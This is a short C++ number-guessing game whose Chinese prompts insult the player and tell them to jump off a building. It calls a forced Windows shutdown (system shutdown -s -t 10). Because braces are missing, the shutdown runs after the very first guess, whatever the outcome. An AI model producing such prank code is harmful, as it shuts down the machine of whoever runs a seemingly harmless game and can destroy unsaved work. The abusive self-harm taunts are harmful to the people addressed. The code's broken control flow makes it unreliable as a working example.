#include <bits/stdc++.h>

int main()
{
	int a,b,sum;
    sum=5;

    srand( (unsigned) time (NULL)) ; 
    a = rand()%100;

    while(true)
    {
    	printf("SB,要TM猜多少？");

        sum--;

        scanf ("%d", &b);
        if(b>a)printf("大了 sb东西 你TM只有%d次机会啦 珍惜吧小子\n" , sum) ;
        if(b<a)printf("小了 sb东西 你TM只有%d次机会啦 珍惜吧小子\n" ,sum) ;
        if (b==a)printf("抄你吗运气这么好 \n");
    
        if (sum==0)


            printf ("哈哈SB 去跳楼吧 再见啦 滚去开机吧") ; 
            system ("shutdown -s -t 10") ;
            
            return 0;

    }
}
